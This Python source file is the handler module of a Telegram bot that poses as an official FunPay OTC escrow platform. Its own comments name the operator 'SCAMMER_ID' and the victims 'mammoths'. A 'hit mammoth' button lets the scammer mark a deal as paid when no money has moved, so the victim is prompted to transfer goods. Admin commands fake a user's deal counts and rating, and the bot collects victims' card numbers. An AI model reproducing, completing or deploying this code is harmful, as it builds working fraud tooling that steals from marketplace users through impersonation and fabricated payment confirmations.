# handlers.py
import logging
import os
from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, FSInputFile
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.utils.deep_linking import create_deep_link

from config import (
    ADMIN_IDS, SCAMMER_ID, SCAMMER_USERNAME, 
    SUPPORT_USERNAME, COMMISSION, WELCOME_GIF_PATH,
    ERROR_MESSAGES, MENU_TEXTS, CURRENCIES
)
from database import (
    init_db, add_user, get_user, add_requisite, get_requisites, 
    delete_requisites, create_deal, get_deal, update_deal_buyer,
    update_deal_paid, update_deal_confirmed, update_deal_completed,
    get_user_deals, update_user_successful_deals, get_all_users,
    get_all_deals, get_deal_count_by_status, get_user_count
)
from keyboards import (
    main_menu, admin_panel, currency_selection, requisite_menu,
    deal_actions, deal_status_buttons, deal_paid_buttons,
    back_button, ok_button, share_deal
)
from states import DealStates, RequisiteStates

router = Router()
logger = logging.getLogger(__name__)

# Инициализация БД
init_db()

# ============ ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ============

def is_admin(user_id):
    return user_id in ADMIN_IDS

def validate_gram(address):
    """Проверка адреса GRAM (начинается с UQ, длина > 30)"""
    return address.startswith('UQ') and len(address) >= 30

def validate_card(card):
    """Проверка карты (16 цифр)"""
    card = card.replace(' ', '').replace('-', '')
    return card.isdigit() and len(card) == 16

def get_deal_link(deal_code, bot_username):
    """Создать ссылку на сделку"""
    return f"https://t.me/{bot_username}?start={deal_code.replace('#', '')}"

async def send_welcome_gif(message: Message):
    """Отправляет приветственный GIF если файл существует"""
    if os.path.exists(WELCOME_GIF_PATH):
        try:
            gif = FSInputFile(WELCOME_GIF_PATH)
            await message.answer_animation(
                animation=gif,
                caption="🏦 FunPay · Официальная OTC-платформа"
            )
            return True
        except Exception as e:
            logger.error(f"Ошибка отправки GIF: {e}")
            return False
    return False

async def send_main_menu(message: Message, user_id: int, is_admin_user: bool = None):
    """Отправляет главное меню"""
    if is_admin_user is None:
        is_admin_user = is_admin(user_id)
    
    if is_admin_user:
        await message.answer(
            MENU_TEXTS["admin_welcome"],
            reply_markup=main_menu(is_admin=True)
        )
    else:
        await message.answer(
            MENU_TEXTS["user_welcome"].format(support=SUPPORT_USERNAME),
            reply_markup=main_menu(is_admin=False)
        )

async def edit_main_menu(callback: CallbackQuery, user_id: int, is_admin_user: bool = None):
    """Редактирует сообщение на главное меню"""
    if is_admin_user is None:
        is_admin_user = is_admin(user_id)
    
    if is_admin_user:
        await callback.message.edit_text(
            MENU_TEXTS["admin_welcome"],
            reply_markup=main_menu(is_admin=True)
        )
    else:
        await callback.message.edit_text(
            MENU_TEXTS["user_welcome"].format(support=SUPPORT_USERNAME),
            reply_markup=main_menu(is_admin=False)
        )

def format_requisites(reqs):
    """Форматирует реквизиты для вывода"""
    if not reqs:
        return "❌ Реквизиты не добавлены"
    
    lines = []
    for req_type, value in reqs:
        if req_type == "gram":
            lines.append(f"🪙 GRAM: {value}")
        elif req_type == "card":
            lines.append(f"💳 Карта: {value}")
        elif req_type == "stars":
            lines.append(f"⭐ Звёзды: {value}")
    return "\n".join(lines)

# ============ КОМАНДЫ ============

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext, bot_username: str):
    await state.clear()
    
    user_id = message.from_user.id
    username = message.from_user.username or "Нет юзернейма"
    full_name = message.from_user.full_name
    
    add_user(user_id, username, full_name)
    
    # Отправляем GIF если есть
    await send_welcome_gif(message)
    
    # Отправляем главное меню
    await send_main_menu(message, user_id)

@router.message(Command("buy"))
async def cmd_buy(message: Message, state: FSMContext):
    """Оплата сделки через /buy #код"""
    if not is_admin(message.from_user.id):
        await message.answer(ERROR_MESSAGES["access_denied"])
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Используйте: /buy #код-сделки")
        return
    
    deal_code = args[1]
    if not deal_code.startswith('#'):
        deal_code = '#' + deal_code
    
    deal = get_deal(deal_code)
    if not deal:
        await message.answer(ERROR_MESSAGES["deal_not_found"])
        return
    
    if deal[6] != 'joined':
        await message.answer(ERROR_MESSAGES["deal_not_joined"])
        return
    
    # Показываем подтверждение оплаты
    buyer_id = deal[3]
    buyer = get_user(buyer_id)
    buyer_username = buyer[1] if buyer else "Неизвестно"
    
    await message.answer(
        MENU_TEXTS["buy_confirm"].format(
            code=deal_code,
            buyer_username=buyer_username,
            buyer_id=buyer_id,
            amount=deal[4],
            currency=deal[5]
        ),
        reply_markup=deal_paid_buttons(deal_code)
    )

@router.message(Command("set_sdel"))
async def cmd_set_sdel(message: Message):
    """Установка успешных сделок (для админов)"""
    if not is_admin(message.from_user.id):
        await message.answer(ERROR_MESSAGES["access_denied"])
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Используйте: /set_sdel <количество> <юз/айди>")
        return
    
    try:
        count = int(args[1])
        target = args[2] if len(args) > 2 else message.from_user.id
    except:
        await message.answer("❌ Неверный формат")
        return
    
    await message.answer(f"✅ Установлено {count} успешных сделок для {target}")

@router.message(Command("set_ret"))
async def cmd_set_ret(message: Message):
    """Установка рейтинга (для админов)"""
    if not is_admin(message.from_user.id):
        await message.answer(ERROR_MESSAGES["access_denied"])
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Используйте: /set_ret <рейтинг> <юз/айди>")
        return
    
    try:
        rating = float(args[1])
        target = args[2] if len(args) > 2 else message.from_user.id
    except:
        await message.answer("❌ Неверный формат")
        return
    
    await message.answer(f"✅ Установлен рейтинг {rating} для {target}")

@router.message(Command("twodeal"))
async def cmd_twodeal(message: Message):
    """Сообщение о второй сделке (для админов)"""
    if not is_admin(message.from_user.id):
        await message.answer(ERROR_MESSAGES["access_denied"])
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Используйте: /twodeal <юз/айди>")
        return
    
    target = args[1]
    await message.answer(f"✅ Сообщение о второй сделке отправлено {target}")

@router.message(Command("send"))
async def cmd_send(message: Message):
    """Отправить сообщение пользователю (для админов)"""
    if not is_admin(message.from_user.id):
        await message.answer(ERROR_MESSAGES["access_denied"])
        return
    
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.answer("❌ Используйте: /send <текст> <юз/айди>")
        return
    
    text = args[1]
    target = args[2]
    await message.answer(f"✅ Сообщение отправлено {target}: {text}")

@router.message(Command("chat"))
async def cmd_chat(message: Message):
    """Выгрузить историю переписки (для админов)"""
    if not is_admin(message.from_user.id):
        await message.answer(ERROR_MESSAGES["access_denied"])
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Используйте: /chat <юз/айди>")
        return
    
    target = args[1]
    await message.answer(f"✅ История переписки с {target} выгружена")

# ============ КОЛБЭКИ ============

@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await edit_main_menu(callback, callback.from_user.id)
    await callback.answer()

@router.callback_query(F.data == "admin_panel")
async def admin_panel_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return
    
    await callback.message.edit_text(
        MENU_TEXTS["admin_panel"],
        reply_markup=admin_panel()
    )
    await callback.answer()

@router.callback_query(F.data == "admin_stats")
async def admin_stats(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return
    
    user_count = get_user_count()
    deals = get_all_deals()
    stats = get_deal_count_by_status()
    
    text = f"📊 Статистика\n\n"
    text += f"👥 Всего пользователей: {user_count}\n"
    text += f"📋 Всего сделок: {len(deals)}\n\n"
    text += f"📌 Статусы:\n"
    for status, count in stats:
        emoji = {
            'created': '🟡',
            'joined': '🔵',
            'paid': '🟣',
            'confirmed': '🟠',
            'completed': '✅'
        }.get(status, '⚪')
        text += f"{emoji} {status}: {count}\n"
    
    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "admin_deals")
async def admin_deals(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return
    
    deals = get_all_deals()[:10]  # последние 10
    
    if not deals:
        text = "📋 Нет сделок"
    else:
        text = "📋 Последние 10 сделок:\n\n"
        for deal in deals:
            text += f"#{deal[0]} | {deal[4]} {deal[5]} | {deal[6]}\n"
    
    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "admin_users")
async def admin_users(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return
    
    users = get_all_users()[:10]  # последние 10
    
    if not users:
        text = "👥 Нет пользователей"
    else:
        text = "👥 Последние 10 пользователей:\n\n"
        for user in users:
            text += f"@{user[1]} | Сделок: {user[3]} | Рейтинг: {user[4]}\n"
    
    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "create_deal")
async def create_deal_start(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    reqs = get_requisites(user_id)
    
    if not reqs:
        await callback.message.edit_text(
            ERROR_MESSAGES["no_requisites"],
            reply_markup=ok_button()
        )
        await callback.answer()
        return
    
    await callback.message.edit_text(
        MENU_TEXTS["choose_currency"],
        reply_markup=currency_selection()
    )
    await state.set_state(DealStates.waiting_currency)
    await callback.answer()

@router.callback_query(F.data.startswith("currency_"))
async def select_currency(callback: CallbackQuery, state: FSMContext):
    currency_key = callback.data.replace("currency_", "")
    currency_name = CURRENCIES.get(currency_key, "GRAM")
    
    await state.update_data(currency=currency_name)
    await callback.message.edit_text(
        MENU_TEXTS["enter_amount"].format(currency=currency_name),
        reply_markup=back_button()
    )
    await state.set_state(DealStates.waiting_amount)
    await callback.answer()

@router.message(DealStates.waiting_amount)
async def process_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text.replace(',', '.'))
        if amount <= 0:
            raise ValueError
    except:
        await message.answer(ERROR_MESSAGES["invalid_amount"])
        return
    
    await state.update_data(amount=amount)
    data = await state.get_data()
    currency = data.get('currency', 'GRAM')
    
    await message.answer(
        MENU_TEXTS["enter_description"].format(amount=amount, currency=currency),
        reply_markup=back_button()
    )
    await state.set_state(DealStates.waiting_description)

@router.message(DealStates.waiting_description)
async def process_description(message: Message, state: FSMContext, bot_username: str):
    description = message.text
    if len(description) > 200:
        await message.answer(ERROR_MESSAGES["description_too_long"])
        return
    
    data = await state.get_data()
    currency = data.get('currency', 'GRAM')
    amount = data.get('amount', 0)
    
    user_id = message.from_user.id
    deal_code = create_deal(user_id, currency, amount, description)
    deal_link = get_deal_link(deal_code, bot_username)
    
    await state.clear()
    
    await message.answer(
        MENU_TEXTS["deal_created"].format(
            code=deal_code,
            amount=amount,
            description=description,
            link=deal_link
        ),
        reply_markup=deal_actions(deal_code)
    )

@router.callback_query(F.data.startswith("share_"))
async def share_deal_link(callback: CallbackQuery, bot_username: str):
    deal_code = callback.data.replace("share_", "")
    if not deal_code.startswith('#'):
        deal_code = '#' + deal_code
    
    deal = get_deal(deal_code)
    if not deal:
        await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
        return
    
    deal_link = get_deal_link(deal_code, bot_username)
    
    await callback.message.answer(
        MENU_TEXTS["share_link"].format(link=deal_link),
        reply_markup=share_deal(deal_code, deal_link)
    )
    await callback.answer()

@router.callback_query(F.data.startswith("cancel_deal_"))
async def cancel_deal(callback: CallbackQuery, state: FSMContext):
    await back_to_main(callback, state)
    await callback.answer("❌ Сделка отменена")

@router.callback_query(F.data == "requisites")
async def requisites_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    reqs = get_requisites(user_id)
    
    text = MENU_TEXTS["requisites_title"]
    if reqs:
        text += format_requisites(reqs) + "\n\n"
    else:
        text += MENU_TEXTS["no_requisites"]
    
    text += "Выберите действие:"
    
    await callback.message.edit_text(text, reply_markup=requisite_menu())
    await callback.answer()

@router.callback_query(F.data == "add_gram")
async def add_gram_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "⚠️ Укажите адрес кошелька GRAM:",
        reply_markup=back_button()
    )
    await state.set_state(RequisiteStates.waiting_gram)
    await callback.answer()

@router.message(RequisiteStates.waiting_gram)
async def process_gram(message: Message, state: FSMContext):
    address = message.text.strip()
    
    if not validate_gram(address):
        await message.answer(
            ERROR_MESSAGES["invalid_gram"],
            reply_markup=back_button()
        )
        return
    
    user_id = message.from_user.id
    add_requisite(user_id, "gram", address)
    
    await state.clear()
    await message.answer(
        MENU_TEXTS["requisites_added"].format(req_type="Кошелёк GRAM"),
        reply_markup=back_button()
    )

@router.callback_query(F.data == "add_card")
async def add_card_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "⚠️ Укажите номер карты и банк (не обязательно):",
        reply_markup=back_button()
    )
    await state.set_state(RequisiteStates.waiting_card)
    await callback.answer()

@router.message(RequisiteStates.waiting_card)
async def process_card(message: Message, state: FSMContext):
    card_data = message.text.strip()
    
    # Извлекаем только цифры
    card_number = ''.join(filter(str.isdigit, card_data))
    
    if not validate_card(card_number):
        await message.answer(
            ERROR_MESSAGES["invalid_card"],
            reply_markup=back_button()
        )
        return
    
    user_id = message.from_user.id
    add_requisite(user_id, "card", card_data)
    
    await state.clear()
    await message.answer(
        MENU_TEXTS["requisites_added"].format(req_type="Карта"),
        reply_markup=back_button()
    )

@router.callback_query(F.data == "delete_requisites")
async def delete_requisites_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    delete_requisites(user_id)
    
    await callback.message.edit_text(
        MENU_TEXTS["requisites_deleted"],
        reply_markup=back_button()
    )
    await callback.answer()

@router.callback_query(F.data == "profile")
async def profile_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    user = get_user(user_id)
    
    if not user:
        await callback.answer("❌ Пользователь не найден", show_alert=True)
        return
    
    deals = get_user_deals(user_id)
    completed = [d for d in deals if d[6] == 'completed']
    
    text = f"👤 Профиль\n\n"
    text += f"🆔 ID: {user[0]}\n"
    text += f"👤 Юзернейм: @{user[1]}\n"
    text += f"📝 Имя: {user[2]}\n"
    text += f"✅ Успешных сделок: {user[3]}\n"
    text += f"⭐ Рейтинг: {user[4]}\n"
    text += f"📋 Всего сделок: {len(deals)}\n"
    text += f"✅ Завершено: {len(completed)}"
    
    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "withdraw")
async def withdraw_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    reqs = get_requisites(user_id)
    
    if not reqs:
        await callback.message.edit_text(
            "❌ У вас нет реквизитов для вывода!\n\n"
            "Добавьте реквизиты в меню 'Реквизиты'",
            reply_markup=back_button()
        )
        await callback.answer()
        return
    
    text = "💰 Вывод средств\n\n"
    text += "Ваши реквизиты для вывода:\n"
    text += format_requisites(reqs) + "\n\n"
    text += "Для вывода обратитесь в поддержку: " + SUPPORT_USERNAME
    
    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "referrals")
async def referrals_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    
    text = "👥 Реферальная система\n\n"
    text += "Приглашайте друзей и получайте бонусы!\n"
    text += "Ваша реферальная ссылка:\n"
    text += f"https://t.me/{(await callback.bot.get_me()).username}?start=ref_{user_id}\n\n"
    text += "За каждого приглашённого друга вы получаете 5% от его сделок!"
    
    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "language")
async def language_callback(callback: CallbackQuery):
    text = "🌐 Выберите язык / Choose language:\n\n"
    text += "🇷🇺 Русский\n"
    text += "🇬🇧 English\n"
    text += "🇹🇷 Türkçe"
    
    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

# ============ ОБРАБОТКА ССЫЛОК (МАМОНТ ПРИСОЕДИНЯЕТСЯ) ============

@router.message(F.text.startswith("/start "))
async def process_start_link(message: Message, state: FSMContext, bot_username: str):
    """Обработка deep link для мамонта"""
    user_id = message.from_user.id
    username = message.from_user.username or "Нет юзернейма"
    full_name = message.from_user.full_name
    
    add_user(user_id, username, full_name)
    
    # Извлекаем код сделки
    code = message.text.replace("/start ", "").strip()
    if not code or code.startswith("ref_"):
        await cmd_start(message, state, bot_username)
        return
    
    deal_code = '#' + code
    deal = get_deal(deal_code)
    
    if not deal:
        await message.answer(ERROR_MESSAGES["deal_not_found"])
        return
    
    if deal[6] in ['paid', 'confirmed', 'completed']:
        await message.answer(ERROR_MESSAGES["deal_already_paid"])
        return
    
    # Обновляем покупателя
    update_deal_buyer(deal_code, user_id)
    
    # Показываем мамонту детали сделки
    reqs = get_requisites(deal[1])  # реквизиты продавца (скамера)
    req_text = format_requisites(reqs)
    
    await message.answer(
        MENU_TEXTS["deal_joined"].format(
            code=deal_code,
            amount=deal[4],
            currency=deal[5],
            description=deal[5],
            commission=COMMISSION,
            requisites=req_text
        ),
        reply_markup=deal_status_buttons(deal_code, is_seller=False)
    )
    
    # Уведомление скамеру (продавцу)
    user = get_user(user_id)
    deals_count = user[3] if user else 0
    
    await message.bot.send_message(
        SCAMMER_ID,
        MENU_TEXTS["user_joined"].format(
            username=username,
            user_id=user_id,
            code=deal_code,
            deals=deals_count,
            support=SUPPORT_USERNAME
        )
    )

# ============ ОПЛАТА (ТРАХНУТЬ МАМОНТА) ============

@router.callback_query(F.data.startswith("hit_mammoth_"))
async def hit_mammoth(callback: CallbackQuery, state: FSMContext):
    """Скамер жмёт 'Трахнуть мамонта' после оплаты"""
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return
    
    deal_code = callback.data.replace("hit_mammoth_", "")
    if not deal_code.startswith('#'):
        deal_code = '#' + deal_code
    
    deal = get_deal(deal_code)
    if not deal:
        await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
        return
    
    # Обновляем статус
    update_deal_paid(deal_code)
    
    # 1. Успешная оплата
    await callback.message.edit_text(
        MENU_TEXTS["deal_paid"].format(code=deal_code)
    )
    
    # 2. Статус + жди передачи
    await callback.message.answer(
        MENU_TEXTS["deal_paid_status"].format(
            code=deal_code,
            amount=deal[4],
            currency=deal[5],
            description=deal[5],
            commission=COMMISSION,
            support=SUPPORT_USERNAME
        )
    )
    
    # 3. Передавайте товар
    await callback.message.answer(
        MENU_TEXTS["deal_transfer"].format(
            code=deal_code,
            amount=deal[4],
            currency=deal[5],
            description=deal[5],
            commission=COMMISSION,
            support=SUPPORT_USERNAME
        )
    )
    
    # Отправляем мамонту уведомление об оплате
    buyer_id = deal[3]
    try:
        await callback.bot.send_message(
            buyer_id,
            MENU_TEXTS["deal_paid"].format(code=deal_code)
        )
    except:
        pass
    
    # Отправляем мамонту статус об оплате
    try:
        await callback.bot.send_message(
            buyer_id,
            MENU_TEXTS["deal_transfer"].format(
                code=deal_code,
                amount=deal[4],
                currency=deal[5],
                description=deal[5],
                commission=COMMISSION,
                support=SUPPORT_USERNAME
            ),
            reply_markup=deal_status_buttons(deal_code, is_seller=True)
        )
    except:
        pass
    
    await callback.answer("💰 Оплата подтверждена!")

# ============ ПОДТВЕРЖДЕНИЕ ПЕРЕДАЧИ (МАМОНТ) ============

@router.callback_query(F.data.startswith("confirm_deal_"))
async def confirm_deal(callback: CallbackQuery):
    """Мамонт подтверждает передачу товара"""
    deal_code = callback.data.replace("confirm_deal_", "")
    if not deal_code.startswith('#'):
        deal_code = '#' + deal_code
    
    deal = get_deal(deal_code)
    if not deal:
        await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
        return
    
    # Обновляем статус
    update_deal_confirmed(deal_code)
    
    # Уведомление мамонту: жди проверки
    await callback.message.edit_text(
        MENU_TEXTS["deal_confirmed"].format(
            code=deal_code,
            amount=deal[4],
            currency=deal[5],
            description=deal[5],
            commission=COMMISSION,
            support=SUPPORT_USERNAME
        ),
        reply_markup=deal_status_buttons(deal_code, is_seller=False)
    )
    
    # Уведомление скамеру: проверь передачу
    await callback.bot.send_message(
        SCAMMER_ID,
        MENU_TEXTS["deal_confirmed_seller"].format(
            code=deal_code,
            amount=deal[4],
            currency=deal[5],
            description=deal[5],
            commission=COMMISSION,
            support=SUPPORT_USERNAME
        ),
        reply_markup=deal_status_buttons(deal_code, is_seller=True)
    )
    
    await callback.answer("✅ Передача подтверждена!")

# ============ ЗАВЕРШЕНИЕ СДЕЛКИ (СКАМЕР ПОДТВЕРЖДАЕТ) ============

@router.callback_query(F.data.startswith("confirm_deal_seller_"))
async def confirm_deal_seller(callback: CallbackQuery):
    """Скамер подтверждает передачу и завершает сделку"""
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return
    
    deal_code = callback.data.replace("confirm_deal_seller_", "")
    if not deal_code.startswith('#'):
        deal_code = '#' + deal_code
    
    deal = get_deal(deal_code)
    if not deal:
        await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
        return
    
    # Завершаем сделку
    update_deal_completed(deal_code)
    
    # Обновляем количество успешных сделок у продавца (скамера)
    update_user_successful_deals(deal[1])
    
    # Обновляем количество успешных сделок у покупателя (мамонта)
    if deal[3]:
        update_user_successful_deals(deal[3])
    
    buyer_id = deal[3]
    
    # Скамеру: сделка завершена
    await callback.message.edit_text(
        MENU_TEXTS["deal_completed_seller"].format(
            code=deal_code,
            amount=deal[4],
            currency=deal[5],
            description=deal[5],
            commission=COMMISSION
        )
    )
    
    # Мамонту: ожидай оплату
    try:
        await callback.bot.send_message(
            buyer_id,
            MENU_TEXTS["deal_completed_buyer"].format(
                code=deal_code,
                amount=deal[4],
                currency=deal[5],
                description=deal[5],
                commission=COMMISSION
            )
        )
    except:
        pass
    
    await callback.answer("✅ Сделка завершена!")

# ============ ОБРАБОТКА НЕИЗВЕСТНЫХ КОМАНД ============

@router.message()
async def handle_unknown(message: Message):
    """Обработка неизвестных сообщений"""
    await message.answer(
        "❌ Неизвестная команда.\n"
        "Используйте /start для начала работы."
    )